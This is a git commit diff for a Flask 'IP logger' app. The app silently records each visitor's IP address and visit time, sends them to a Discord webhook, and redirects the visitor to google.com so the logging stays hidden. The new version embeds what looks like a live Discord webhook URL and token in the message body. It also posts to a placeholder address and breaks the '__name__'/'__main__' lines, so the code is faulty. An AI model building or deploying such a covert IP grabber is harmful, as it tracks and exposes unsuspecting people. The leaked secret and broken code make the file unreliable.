9ce1efbd7d6a24b6995684facd79e9dcf8387f26
Mohamed Zaher <cfdhoi@gmail.com>
2025-07-01 21:54:18 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,32 +1,25 @@
 from flask import Flask, request, redirect
 from datetime import datetime
 import requests
-import os
-
-app = Flask(__name__)
-
+app = Flask(name)
 def send_ip(ip, date):
-    webhook_url = os.getenv("DISCORD_WEBHOOK")
-    if not webhook_url:
-        return
+    webhook_url = "WEBHOOK_URL_HERE"
     data = {
-        "content": None,
-        "embeds": [
-            {
-                "title": "New Visitor IP",
-                "description": f"IP: {ip}\nTime: {date}",
-                "color": 5814783
-            }
-        ]
+        "content": "https://discord.com/api/webhooks/1389671364117397594/jQhf499StnTMzV3J0s2suuI3_S6D7eHi40UNWJx4dY5eC8oSHUke0657sXN7cWB6Vmnr",
+        "title": "IP Log"
     }
+    data["embeds"] = [
+        {
+            "title": ip,
+            "description": date
+         }
+    ]
     requests.post(webhook_url, json=data)
-
 @app.route("/")
 def index():
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
+    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
     send_ip(ip, date)
     return redirect("https://google.com")
-
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000)
+if name == "main":
+    app.run(host='0.0.0.0')
